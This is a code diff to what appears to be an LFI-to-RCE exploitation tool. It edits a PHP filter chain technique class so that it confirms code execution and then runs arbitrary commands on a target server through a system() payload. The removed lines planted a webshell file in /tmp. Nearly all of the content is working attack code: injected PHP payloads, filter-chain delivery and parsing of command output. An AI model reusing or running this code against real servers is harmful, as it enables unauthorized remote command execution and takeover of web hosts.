@@ -51,35 +51,28 @@ class PHPFilterTechnique(TechniqueBase):
         """
         logger.info("Checking if target is vulnerable to PHP filter technique")
         
-        # Try different detection payloads
-        payloads = [
-            f"<?php echo '{self.detection_string}'; ?>",
-            f"<?php print('{self.detection_string}'); ?>",
-            f"<?php die('{self.detection_string}'); ?>"
-        ]
+        # Use a minimal payload for detection to avoid HTTP 414
+        payload = f"<?php echo '{self.detection_string}'; ?>"
         
-        for payload in payloads:
-            try:
-                filter_chain = generate_filter_chain(payload)
-                if self.verbose:
-                    logger.debug(f"Using filter chain for detection: {filter_chain[:100]}...")
-                
-                # Try to include the filter chain
-                result = self.leak_function(filter_chain)
-                
-                if self.verbose:
-                    # Print a reasonable portion of the response
-                    preview = result[:500] if len(result) > 500 else result
-                    logger.debug(f"Response preview:\n{preview}")
-                
-                # Check if our detection string is in the response
-                if self.detection_string in result:
-                    logger.info(f"Target is vulnerable to PHP filter technique! Detection string found: {self.detection_string}")
-                    logger.debug(f"Detection string position: {result.find(self.detection_string)}")
-                    return True
-            except Exception as e:
-                logger.debug(f"Error during check: {str(e)}")
-                continue
+        try:
+            filter_chain = generate_filter_chain(payload)
+            if self.verbose:
+                logger.debug(f"Using filter chain for detection: {filter_chain[:100]}...")
+            
+            # Try to include the filter chain
+            result = self.leak_function(filter_chain)
+            
+            if self.verbose:
+                # Print a reasonable portion of the response
+                preview = result[:500] if len(result) > 500 else result
+                logger.debug(f"Response preview:\n{preview}")
+            
+            # Check if our detection string is in the response
+            if self.detection_string in result:
+                logger.info(f"Target is vulnerable to PHP filter technique! Detection string found: {self.detection_string}")
+                return True
+        except Exception as e:
+            logger.debug(f"Error during check: {str(e)}")
         
         logger.info("Target does not appear vulnerable to PHP filter technique")
         return False
@@ -88,42 +81,39 @@ class PHPFilterTechnique(TechniqueBase):
         """
         Exploit the LFI using PHP filters to achieve RCE.
         
+        For PHP filter technique, we'll use a different approach to avoid HTTP 414 errors:
+        - We won't create a persistent shell file
+        - Instead, we'll confirm we can execute PHP code and set a flag
+        
         Returns:
             True if successful, False otherwise
         """
         logger.info("Exploiting using PHP filter technique")
         
-        # Create a webshell payload
-        shell_filename = f"/tmp/shell_{self.shell_token}.php"
+        # Simplified verification of RCE capability
+        test_payload = f"<?php echo '{self.detection_string}_RCE_TEST'; ?>"
         
-        # Generate the payload to create a shell file
-        payload = f"""<?php
-        $shell_code = '<?php {self.php_code} ?>';
-        file_put_contents('{shell_filename}', $shell_code);
-        echo "SHELL_CREATED:{shell_filename}";
-        ?>"""
-        
-        # Generate the filter chain for this payload
-        filter_chain = generate_filter_chain(payload)
-        
-        # Execute the payload to create the shell file
-        result = self.leak_function(filter_chain)
-        
-        # Check if shell was created
-        if "SHELL_CREATED:" in result:
-            # Extract the shell path
-            match = re.search(r"SHELL_CREATED:(.*)", result)
-            if match:
-                self.shell_path = match.group(1).strip()
-                logger.info(f"Shell created at {self.shell_path}")
+        try:
+            filter_chain = generate_filter_chain(test_payload)
+            result = self.leak_function(filter_chain)
+            
+            if f"{self.detection_string}_RCE_TEST" in result:
+                logger.info("PHP code execution confirmed")
+                
+                # Set a virtual shell path to indicate success
+                self.shell_path = "php://filter"
                 return True
-        
-        logger.error("Failed to create shell via PHP filter technique")
-        return False
+            else:
+                logger.error("PHP code execution failed")
+                return False
+                
+        except Exception as e:
+            logger.error(f"Failed to execute PHP code: {str(e)}")
+            return False
     
     def execute(self, command: str) -> str:
         """
-        Execute a command via the established RCE.
+        Execute a command with a minimal payload to avoid HTTP 414 errors.
         
         Args:
             command: Command to execute
@@ -134,31 +124,33 @@ class PHPFilterTechnique(TechniqueBase):
         if not self.shell_path:
             raise ExecutionError("No shell established. Run exploit() first.")
         
-        # Encode the command
-        encoded_command = urllib.parse.quote(command)
+        # Encode the command to avoid issues with quotes and special characters
+        encoded_command = command.replace("'", "\\'").replace('"', '\\"')
         
-        # Create a payload to execute the command and capture output
-        payload = f"""<?php
-        $output = '';
-        if (file_exists('{self.shell_path}')) {{
-            ob_start();
-            include '{self.shell_path}';
-            $output = ob_get_clean();
-        }} else {{
-            $output = 'Shell file not found at {self.shell_path}';
-        }}
-        echo "CMD_OUTPUT_START\\n" . $output . "\\nCMD_OUTPUT_END";
-        ?>"""
+        # Super minimal payload - single function with minimal output markers
+        payload = f"<?php echo 'S:';system('{encoded_command}');echo ':E'; ?>"
         
-        # Generate the filter chain for this payload
-        filter_chain = generate_filter_chain(payload)
-        
-        # Execute the payload
-        result = self.leak_function(filter_chain + f"&cmd={encoded_command}")
-        
-        # Extract the command output
-        match = re.search(r"CMD_OUTPUT_START\n(.*?)\nCMD_OUTPUT_END", result, re.DOTALL)
-        if match:
-            return match.group(1)
-        else:
-            raise ExecutionError("Failed to execute command or parse output")
+        try:
+            # Generate the filter chain for this payload
+            filter_chain = generate_filter_chain(payload)
+            
+            # Execute the payload
+            result = self.leak_function(filter_chain)
+            
+            # Extract the command output with minimal markers
+            match = re.search(r"S:(.*?):E", result, re.DOTALL)
+            if match:
+                return match.group(1)
+            else:
+                # If we couldn't find the markers, return a substring of the result
+                # Look for common patterns in command output
+                for pattern in ["uid=", "total ", "Linux ", "www-data"]:
+                    if pattern in result:
+                        start_idx = result.find(pattern)
+                        return result[start_idx:start_idx+1000]
+                
+                # Last resort, return a portion of the raw response
+                return result[:500]
+                    
+        except Exception as e:
+            raise ExecutionError(f"Failed to execute command: {str(e)}")
